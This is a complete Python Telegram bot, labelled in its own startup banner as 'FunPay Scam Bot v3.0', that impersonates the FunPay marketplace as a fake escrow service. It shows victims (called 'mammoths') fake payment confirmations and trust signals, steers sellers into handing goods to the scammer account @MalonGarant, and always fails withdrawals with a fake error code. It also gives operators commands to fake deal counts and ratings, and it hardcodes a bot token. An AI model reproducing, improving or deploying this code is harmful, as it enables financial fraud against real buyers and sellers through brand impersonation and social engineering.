import asyncio
import random
import string
import logging
import os
import glob
import json
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram.utils import executor
from aiogram.dispatcher.filters import Command
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup

# ============================================================
# КОНФИГ
# ============================================================
BOT_TOKEN = "8871224360:AAEjVO4h1c_3nzM4u2BWBdVhmmpfiiUayjc"
ADMIN_FILE = "admins.txt"
GIF_FOLDER = "gif"
DEALS_FILE = "deals.json"
USERS_FILE = "users.json"
HELPER_USERNAME = "MalonGarant"  # ← ЗАМЕНЕНО НА MalonGarant

# ============================================================
# ЗАГРУЗКА ДАННЫХ
# ============================================================
def load_admins():
    try:
        with open(ADMIN_FILE, "r") as f:
            return [int(line.strip()) for line in f if line.strip().isdigit()]
    except:
        return []

def load_json(filename, default):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default

def save_json(filename, data):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

ADMINS = load_admins()
user_data = load_json(USERS_FILE, {})
deal_data = load_json(DEALS_FILE, {})

# ============================================================
# ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())
logging.basicConfig(level=logging.INFO)

# ============================================================
# СОСТОЯНИЯ
# ============================================================
class DealStates(StatesGroup):
    waiting_currency = State()
    waiting_amount = State()
    waiting_description = State()
    waiting_gram_address = State()
    waiting_card_number = State()
    waiting_deal_code = State()

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================
def get_user(user_id):
    if str(user_id) not in user_data:
        user_data[str(user_id)] = {
            "balance": 0,
            "deals": 0,
            "rating": 0.0,
            "reviews": 0,
            "level": "Новичок",
            "commission": 3.0,
            "registered": datetime.now().isoformat(),
            "wallets": {"gram": None, "card": None}
        }
        save_json(USERS_FILE, user_data)
    return user_data[str(user_id)]

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def get_gif():
    gif_files = glob.glob(os.path.join(GIF_FOLDER, "*.gif"))
    return gif_files[0] if gif_files else None

async def send_with_gif(chat_id, text, keyboard=None, parse_mode="Markdown"):
    gif_path = get_gif()
    if gif_path:
        try:
            gif = InputFile(gif_path)
            await bot.send_animation(chat_id, animation=gif, caption=text, reply_markup=keyboard, parse_mode=parse_mode)
        except Exception as e:
            logging.error(f"GIF ERROR: {e}")
            await bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode=parse_mode)
    else:
        await bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode=parse_mode)

def is_admin(user_id):
    return user_id in ADMINS

def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("👤 Профиль", callback_data="profile"),
        InlineKeyboardButton("💰 Баланс", callback_data="balance")
    )
    kb.add(
        InlineKeyboardButton("📤 Вывод", callback_data="withdraw"),
        InlineKeyboardButton("📋 Сделки", callback_data="my_deals")
    )
    kb.add(
        InlineKeyboardButton("❓ Помощь", callback_data="help"),
        InlineKeyboardButton("🌐 Язык", callback_data="language")
    )
    kb.add(InlineKeyboardButton("💳 Реквизиты", callback_data="requisites"))
    return kb

def get_requisites_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("➕ Добавить GRAM", callback_data="add_gram"),
        InlineKeyboardButton("➕ Добавить карту", callback_data="add_card"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_main")
    )
    return kb

def get_currency_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("💎 GRAM", callback_data="currency_gram"),
        InlineKeyboardButton("💳 Карта", callback_data="currency_card"),
        InlineKeyboardButton("⭐ Звёзды", callback_data="currency_stars"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_main")
    )
    return kb

# ============================================================
# /START
# ============================================================
@dp.message_handler(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.finish()
    user_id = message.from_user.id
    args = message.text.split()
    
    if len(args) > 1 and args[1] in deal_data:
        deal_id = args[1]
        deal = deal_data[deal_id]
        if deal["status"] == "created":
            wallet = deal.get("wallet", "Не указан")
            text = f"💳 **Сделка #{deal_id}**\n\n"
            text += f"Сумма: {deal['amount']} {deal['currency']}\n"
            text += f"Описание: {deal['description']}\n"
            text += f"Комиссия: 3.0%\n\n"
            text += f"**Реквизиты для оплаты:**\n"
            text += f"- {deal['currency']}\n"
            text += f"  Переведите точную сумму на:\n"
            text += f"  `{wallet}`\n\n"
            text += f"После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!"
            
            kb = InlineKeyboardMarkup(row_width=2)
            kb.add(
                InlineKeyboardButton("🆘 Саппорт", callback_data="support"),
                InlineKeyboardButton("✅ Я оплатил", callback_data=f"pay_{deal_id}")
            )
            await send_with_gif(message.chat.id, text, kb)
            return
    
    user = get_user(user_id)
    
    if is_admin(user_id):
        text = "🔥 **Приветствую, воркер!**\n\nНаши команды:\n"
        text += "/buy *код-сделки* – для оплаты сделки\n"
        text += "/set_sdel – для установки успешных сделок\n"
        text += "/set_ret – для установки рейтинга (в профиле)\n"
        text += "/twodeal *юз/айди* – сообщение о второй сделке\n"
        text += "/send *текст* *юз/айди* – отправить сообщение\n"
        text += "/chat *юз/айди* – выгрузить историю переписки"
        await send_with_gif(message.chat.id, text, get_main_menu())
    else:
        text = "🤑 **FunPay | Бот**\n\n👥 50 378 пользователей\n\nИспользуйте меню для навигации."
        await send_with_gif(message.chat.id, text, get_main_menu())

# ============================================================
# /buy
# ============================================================
@dp.message_handler(Command("buy"))
async def cmd_buy(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён. Только для воркеров.")
        return
    
    args = message.text.split()
    if len(args) > 1:
        deal_id = args[1].replace("#", "")
        if deal_id in deal_data and deal_data[deal_id]["status"] == "paid":
            deal = deal_data[deal_id]
            text = f"**Вы уверены что хотите провести оплату по сделке #{deal_id}?**\n\n"
            text += f"**Мамонт:** @{deal.get('buyer_username', 'unknown')} ({deal['buyer_id']})\n"
            text += f"**Сумма:** {deal['amount']} {deal['currency']}\n"
            text += f"**Описание:** {deal['description']}"
            
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(
                InlineKeyboardButton("🔨 Трахнуть мамонта", callback_data=f"hit_{deal_id}"),
                InlineKeyboardButton("💬 Сообщение", callback_data=f"msg_{deal_id}")
            )
            await send_with_gif(message.chat.id, text, kb)
            return
        else:
            await message.answer("❌ Сделка не найдена или не оплачена")
            return
    
    await message.answer("**Выберите валюту сделки:**", reply_markup=get_currency_menu())
    await state.set_state(DealStates.waiting_currency)

# ============================================================
# ВЫБОР ВАЛЮТЫ
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("currency_"), state=DealStates.waiting_currency)
async def process_currency(call: types.CallbackQuery, state: FSMContext):
    currency = call.data.split("_")[1]
    user_id = call.from_user.id
    user = get_user(user_id)
    
    if currency == "gram" and not user["wallets"]["gram"]:
        await send_with_gif(
            call.message.chat.id,
            "❗ **У вас ещё не добавлен реквизит GRAM!**\n\n"
            "Добавьте его здесь: Главное меню → Реквизиты → Добавить GRAM",
            InlineKeyboardMarkup(row_width=1).add(
                InlineKeyboardButton("✅ OK", callback_data="back_main"),
                InlineKeyboardButton("🔙 Вернуться к списку реквизитов", callback_data="requisites")
            )
        )
        await call.answer()
        await state.finish()
        return
    
    if currency == "card" and not user["wallets"]["card"]:
        await send_with_gif(
            call.message.chat.id,
            "❗ **У вас ещё не добавлена карта!**\n\n"
            "Добавьте её здесь: Главное меню → Реквизиты → Добавить карту",
            InlineKeyboardMarkup(row_width=1).add(
                InlineKeyboardButton("✅ OK", callback_data="back_main"),
                InlineKeyboardButton("🔙 Вернуться к списку реквизитов", callback_data="requisites")
            )
        )
        await call.answer()
        await state.finish()
        return
    
    if currency == "stars":
        pass
    
    await state.update_data(currency=currency)
    await call.message.edit_text("**Введите сумму сделки:**")
    await state.set_state(DealStates.waiting_amount)
    await call.answer()

# ============================================================
# СУММА
# ============================================================
@dp.message_handler(state=DealStates.waiting_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount <= 0:
            await message.answer("❌ Сумма должна быть больше 0")
            return
    except:
        await message.answer("❌ Введите число")
        return
    
    await state.update_data(amount=amount)
    data = await state.get_data()
    currency = data.get("currency", "")
    
    emoji = {"gram": "🧑‍💻", "card": "💳", "stars": "⭐"}.get(currency, "🪙")
    
    await message.answer(f"**Что вы предлагаете за {amount} {emoji}?**")
    await state.set_state(DealStates.waiting_description)

# ============================================================
# ОПИСАНИЕ
# ============================================================
@dp.message_handler(state=DealStates.waiting_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text
    data = await state.get_data()
    amount = data["amount"]
    currency = data["currency"]
    user_id = message.from_user.id
    user = get_user(user_id)
    
    deal_id = generate_deal_id()
    wallet = user["wallets"].get(currency, "Не указан")
    
    deal_data[deal_id] = {
        "amount": amount,
        "currency": currency,
        "description": description,
        "seller": user_id,
        "buyer_id": None,
        "buyer_username": None,
        "wallet": wallet,
        "status": "created",
        "created_at": datetime.now().isoformat()
    }
    save_json(DEALS_FILE, deal_data)
    
    text = f"✅ **Сделка создана!**\n\n"
    text += f"Номер сделки: #{deal_id}\n"
    text += f"Сумма: {amount}\n"
    text += f"Описание: {description}\n\n"
    text += f"Ссылка для покупателя:\n"
    text += f"`https://t.me/{bot.get_me().username}?start={deal_id}`\n\n"
    text += f"Отправьте эту ссылку покупателю для совершения оплаты!"
    
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📤 Поделиться ссылкой", callback_data=f"share_{deal_id}"),
        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{deal_id}")
    )
    await send_with_gif(message.chat.id, text, kb)
    await state.finish()

# ============================================================
# РЕКВИЗИТЫ
# ============================================================
@dp.callback_query_handler(lambda c: c.data == "requisites")
async def show_requisites(call: types.CallbackQuery):
    user = get_user(call.from_user.id)
    text = "**Выберите кошелёк для добавления:**"
    
    kb = InlineKeyboardMarkup(row_width=1)
    if user["wallets"]["gram"]:
        text += f"\n\n💎 GRAM: `{user['wallets']['gram']}`"
        kb.add(InlineKeyboardButton("🗑 Удалить GRAM", callback_data="del_gram"))
        kb.add(InlineKeyboardButton("✏️ Изменить GRAM", callback_data="edit_gram"))
    else:
        kb.add(InlineKeyboardButton("➕ Добавить GRAM", callback_data="add_gram"))
    
    if user["wallets"]["card"]:
        text += f"\n💳 Карта: `{user['wallets']['card']}`"
        kb.add(InlineKeyboardButton("🗑 Удалить карту", callback_data="del_card"))
        kb.add(InlineKeyboardButton("✏️ Изменить карту", callback_data="edit_card"))
    else:
        kb.add(InlineKeyboardButton("➕ Добавить карту", callback_data="add_card"))
    
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back_main"))
    
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

# ============================================================
# ДОБАВЛЕНИЕ GRAM
# ============================================================
@dp.callback_query_handler(lambda c: c.data == "add_gram")
async def add_gram_start(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("**Укажите адрес кошелька GRAM:**")
    await state.set_state(DealStates.waiting_gram_address)
    await call.answer()

@dp.message_handler(state=DealStates.waiting_gram_address)
async def process_gram_address(message: types.Message, state: FSMContext):
    address = message.text.strip()
    
    if not address.startswith("UQ") or len(address) < 20:
        await send_with_gif(
            message.chat.id,
            "⚠️ **Вы указали неверный адрес кошелька GRAM!**\n"
            "❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст",
            InlineKeyboardMarkup(row_width=1).add(
                InlineKeyboardButton("⚠️ Укажите адрес кошелька GRAM:", callback_data="retry_gram"),
                InlineKeyboardButton("← Назад", callback_data="requisites")
            )
        )
        return
    
    user = get_user(message.from_user.id)
    user["wallets"]["gram"] = address
    save_json(USERS_FILE, user_data)
    
    await message.answer("✅ **Реквизиты GRAM успешно добавлены!**")
    await state.finish()
    await cmd_start(message, state)

# ============================================================
# ДОБАВЛЕНИЕ КАРТЫ
# ============================================================
@dp.callback_query_handler(lambda c: c.data == "add_card")
async def add_card_start(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("**Укажите номер карты и банк (не обязательно):**")
    await state.set_state(DealStates.waiting_card_number)
    await call.answer()

@dp.message_handler(state=DealStates.waiting_card_number)
async def process_card_number(message: types.Message, state: FSMContext):
    card = message.text.strip()
    
    if len(card.replace(" ", "")) < 10:
        await message.answer("⚠️ **Неверный номер карты!**\nПопробуйте снова:")
        return
    
    user = get_user(message.from_user.id)
    user["wallets"]["card"] = card
    save_json(USERS_FILE, user_data)
    
    await message.answer("✅ **Реквизиты карты успешно добавлены!**")
    await state.finish()
    await cmd_start(message, state)

# ============================================================
# УДАЛЕНИЕ РЕКВИЗИТОВ
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("del_"))
async def delete_requisite(call: types.CallbackQuery):
    user = get_user(call.from_user.id)
    if "gram" in call.data:
        user["wallets"]["gram"] = None
        await call.answer("✅ GRAM удалён")
    elif "card" in call.data:
        user["wallets"]["card"] = None
        await call.answer("✅ Карта удалена")
    save_json(USERS_FILE, user_data)
    await show_requisites(call)

# ============================================================
# ИЗМЕНЕНИЕ РЕКВИЗИТОВ
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("edit_"))
async def edit_requisite(call: types.CallbackQuery, state: FSMContext):
    if "gram" in call.data:
        await call.message.edit_text("**Укажите новый адрес кошелька GRAM:**")
        await state.set_state(DealStates.waiting_gram_address)
    elif "card" in call.data:
        await call.message.edit_text("**Укажите новый номер карты:**")
        await state.set_state(DealStates.waiting_card_number)
    await call.answer()

# ============================================================
# Я ОПЛАТИЛ (ПОКУПАТЕЛЬ)
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("pay_"))
async def process_pay(call: types.CallbackQuery):
    deal_id = call.data.split("_")[1]
    if deal_id not in deal_data:
        await call.answer("❌ Сделка не найдена")
        return
    
    deal = deal_data[deal_id]
    if deal["status"] != "created":
        await call.answer("❌ Сделка уже обработана")
        return
    
    deal["status"] = "paid"
    deal["buyer_id"] = call.from_user.id
    deal["buyer_username"] = call.from_user.username or call.from_user.first_name
    deal["updated_at"] = datetime.now().isoformat()
    save_json(DEALS_FILE, deal_data)
    
    for admin_id in ADMINS:
        try:
            await bot.send_message(
                admin_id,
                f"🔔 @{deal['buyer_username']} ({deal['buyer_id']}) присоединился к сделке #{deal_id}!\n"
                f"Успешных сделок: {get_user(deal['buyer_id'])['deals']}\n\n"
                f"⚠️ Не передавайте товар на @{HELPER_USERNAME}, пока бот не уведомит покупателя об оплате!"
            )
        except:
            pass
    
    text = f"✔ **Оплата по сделке #{deal_id} успешно получена!**\n"
    text += f"Продавец получил уведомление\n\n"
    text += f"**Сделка #{deal_id}:**\n"
    text += f"Сумма: {deal['amount']} 🌟\n"
    text += f"Описание: {deal['description']}\n"
    text += f"Комиссия: 3.0%\n\n"
    text += f"🟢 Статус сделки: покупатель успешно оплатил\n\n"
    text += f"❗ Дождитесь, пока продавец передаст товар на аккаунт @{HELPER_USERNAME}, а затем подтвердите это в боте!"
    
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📦 Подтвердить передачу", callback_data=f"confirm_{deal_id}"),
        InlineKeyboardButton("🆘 Поддержка", callback_data="support")
    )
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

# ============================================================
# ТРАХНУТЬ МАМОНТА
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("hit_"))
async def hit_mammoth(call: types.CallbackQuery):
    deal_id = call.data.split("_")[1]
    if deal_id not in deal_data:
        await call.answer("❌ Сделка не найдена")
        return
    
    deal = deal_data[deal_id]
    if deal["status"] != "paid":
        await call.answer("❌ Сделка не оплачена")
        return
    
    buyer_id = deal["buyer_id"]
    text = f"**Сделка #{deal_id}:**\n"
    text += f"Сумма: {deal['amount']} 🌟\n"
    text += f"Описание: {deal['description']}\n"
    text += f"Комиссия: 3.0%\n\n"
    text += f"⭐ Статус сделки: покупатель успешно оплатил\n"
    text += f"🟢 **ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО** 🟢\n"
    text += f"❗️ @{HELPER_USERNAME} ❗️\n"
    text += f"🟢 **ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО** 🟢\n\n"
    text += f"В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату.\n"
    text += f"Рекомендуем записывать экран во время передачи товара, чтобы поддержка могла лучше разобраться в ситуации при необходимости."
    
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📦 Подтвердить передачу", callback_data=f"confirm_{deal_id}"),
        InlineKeyboardButton("🆘 Поддержка", callback_data="support")
    )
    
    try:
        await send_with_gif(buyer_id, text, kb)
        await call.message.edit_text("✅ Сообщение отправлено покупателю")
    except:
        await call.message.edit_text("❌ Не удалось отправить сообщение покупателю")
    await call.answer()

# ============================================================
# ПОДТВЕРДИТЬ ПЕРЕДАЧУ (ПОКУПАТЕЛЬ)
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("confirm_"))
async def confirm_transfer(call: types.CallbackQuery):
    deal_id = call.data.split("_")[1]
    if deal_id not in deal_data:
        await call.answer("❌ Сделка не найдена")
        return
    
    deal = deal_data[deal_id]
    if deal["status"] != "paid":
        await call.answer("❌ Сделка уже подтверждена")
        return
    
    deal["status"] = "confirmed"
    deal["updated_at"] = datetime.now().isoformat()
    save_json(DEALS_FILE, deal_data)
    
    text = f"**Сделка #{deal_id}:**\n"
    text += f"Сумма: {deal['amount']} ₽\n"
    text += f"Описание: {deal['description']}\n"
    text += f"Комиссия: 3.0%\n\n"
    text += f"**Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара**\n\n"
    text += f"Ожидайте проверки покупателем и подтверждения перевода на аккаунт @{HELPER_USERNAME}.\n"
    text += f"Если товар не был передан на @{HELPER_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!"
    
    kb = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton("🆘 Поддержка", callback_data="support")
    )
    await send_with_gif(call.message.chat.id, text, kb)
    
    for admin_id in ADMINS:
        try:
            await bot.send_message(
                admin_id,
                f"**Сделка #{deal_id}:**\n"
                f"Сумма: {deal['amount']} ₽\n"
                f"Описание: {deal['description']}\n"
                f"Комиссия: 3.0%\n\n"
                f"**Статус сделки: покупатель оплатил, продавец подтвердил передачу товара**\n\n"
                f"Проверьте передачу товара на @{HELPER_USERNAME} и подтвердите это в системе бота.\n"
                f"После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!",
                reply_markup=InlineKeyboardMarkup(row_width=1).add(
                    InlineKeyboardButton("✅ Подтвердить передачу", callback_data=f"complete_{deal_id}")
                )
            )
        except:
            pass
    
    await call.answer()

# ============================================================
# ПОДТВЕРДИТЬ ПЕРЕДАЧУ (АДМИН)
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("complete_"))
async def complete_deal(call: types.CallbackQuery):
    deal_id = call.data.split("_")[1]
    if deal_id not in deal_data:
        await call.answer("❌ Сделка не найдена")
        return
    
    deal = deal_data[deal_id]
    if deal["status"] != "confirmed":
        await call.answer("❌ Сделка не подтверждена")
        return
    
    deal["status"] = "completed"
    deal["updated_at"] = datetime.now().isoformat()
    save_json(DEALS_FILE, deal_data)
    
    text = f"✅ **Сделка #{deal_id} успешно завершена!**\n\n"
    text += f"Пожалуйста, дождитесь поступления товара на ваш аккаунт!\n\n"
    text += f"Ожидайте поступления оплаты на указанный вами ранее кошелёк!"
    
    kb = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton("🏠 Меню", callback_data="back_main")
    )
    await send_with_gif(call.message.chat.id, text, kb)
    
    buyer_id = deal["buyer_id"]
    if buyer_id:
        try:
            await send_with_gif(
                buyer_id,
                f"✅ **Сделка #{deal_id} успешно завершена!**\n\n"
                f"Ожидайте поступления оплаты на указанный вами ранее кошелёк!"
            )
        except:
            pass
    
    await call.answer()

# ============================================================
# ПОДЕЛИТЬСЯ ССЫЛКОЙ
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("share_"))
async def share_deal(call: types.CallbackQuery):
    deal_id = call.data.split("_")[1]
    if deal_id not in deal_data:
        await call.answer("❌ Сделка не найдена")
        return
    
    deal = deal_data[deal_id]
    text = f"📤 **Отправить**\nВыберите чаты\n\n"
    text += f"По этой ссылке можно перейти на сделку со мной 🛒\n"
    text += f"`https://t.me/{bot.get_me().username}?start={deal_id}`\n\n"
    text += f"**Telegram**\n"
    text += f"**FunPay | Bot**\n"
    text += f"Все сделки проводятся строго ВНУТРИ БОТА!\n"
    text += f"Сделки в чатах - мошенничество!\n\n"
    text += f"**Комиссия - 3%**\n"
    text += f"**Сайт - funpay.com**"
    
    kb = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton("📨 Отправить", callback_data=f"send_share_{deal_id}"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_main")
    )
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("send_share_"))
async def send_share(call: types.CallbackQuery):
    await call.answer("✅ Ссылка отправлена!", show_alert=True)
    await cmd_start(call.message, None)

# ============================================================
# ОТМЕНА СДЕЛКИ
# ============================================================
@dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
async def cancel_deal(call: types.CallbackQuery):
    deal_id = call.data.split("_")[1]
    if deal_id in deal_data:
        deal_data[deal_id]["status"] = "cancelled"
        save_json(DEALS_FILE, deal_data)
        await call.message.edit_text(f"❌ Сделка #{deal_id} отменена")
    await call.answer()

# ============================================================
# ПОДДЕРЖКА
# ============================================================
@dp.callback_query_handler(lambda c: c.data == "support")
async def support(call: types.CallbackQuery):
    text = f"🆘 **Поддержка**\n\nСвяжитесь с оператором: @{HELPER_USERNAME}\nОжидайте ответа в течение 5-15 минут."
    kb = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton("🔙 Назад", callback_data="back_main")
    )
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

# ============================================================
# НАЗАД В ГЛАВНОЕ МЕНЮ
# ============================================================
@dp.callback_query_handler(lambda c: c.data == "back_main")
async def back_main(call: types.CallbackQuery, state: FSMContext = None):
    if state:
        await state.finish()
    await cmd_start(call.message, state)
    await call.answer()

# ============================================================
# ПРОЧИЕ КОЛБЭКИ
# ============================================================
@dp.callback_query_handler(lambda c: c.data == "profile")
async def profile(call: types.CallbackQuery):
    user = get_user(call.from_user.id)
    text = f"👤 **Профиль**\n"
    text += f"Баланс: {user['balance']} STARS\n"
    text += f"Успешные сделки: {user['deals']}\n"
    text += f"Уровень: {user['level']}\n"
    text += f"Комиссия: {user['commission']}%\n"
    text += f"Рейтинг: ★★★★★ {user['rating']}/5 ({user['reviews']})"
    kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("🔙 Назад", callback_data="back_main"))
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

@dp.callback_query_handler(lambda c: c.data == "balance")
async def balance(call: types.CallbackQuery):
    user = get_user(call.from_user.id)
    text = f"💰 **Ваш баланс:**\nSTARS: {user['balance']}\n\nOK"
    kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("🔙 Назад", callback_data="back_main"))
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

@dp.callback_query_handler(lambda c: c.data == "withdraw")
async def withdraw(call: types.CallbackQuery):
    await send_with_gif(
        call.message.chat.id,
        "❌ **Ошибка вывода**\nНе удалось обработать запрос. Проверьте данные кошелька или свяжитесь с поддержкой.\nКод ошибки: #WDR-42"
    )
    await call.answer()

@dp.callback_query_handler(lambda c: c.data == "my_deals")
async def my_deals(call: types.CallbackQuery):
    text = "📋 **Мои сделки**\n\nЗдесь будут ваши сделки"
    kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("🔙 Назад", callback_data="back_main"))
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

@dp.callback_query_handler(lambda c: c.data == "help")
async def help_menu(call: types.CallbackQuery):
    text = "❓ **Помощь**\n\n🆘 Поддержка: @helper_deal"
    kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("🔙 Назад", callback_data="back_main"))
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

@dp.callback_query_handler(lambda c: c.data == "language")
async def language(call: types.CallbackQuery):
    text = "🌐 **Выберите язык:**"
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back_main"))
    await send_with_gif(call.message.chat.id, text, kb)
    await call.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("lang_"))
async def set_lang(call: types.CallbackQuery):
    await call.answer("✅ Язык изменён", show_alert=True)
    await back_main(call)

@dp.callback_query_handler(lambda c: c.data == "retry_gram")
async def retry_gram(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("**Укажите адрес кошелька GRAM:**")
    await state.set_state(DealStates.waiting_gram_address)
    await call.answer()

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 FunPay Scam Bot v3.0 - ПОЛНАЯ КОПИЯ")
    print("=" * 60)
    print(f"👥 Админы: {ADMINS}")
    print(f"📁 Пользователей: {len(user_data)}")
    print(f"📋 Сделок: {len(deal_data)}")
    print(f"🎬 Гифки из папки: {GIF_FOLDER}")
    print("=" * 60)
    executor.start_polling(dp, skip_updates=True)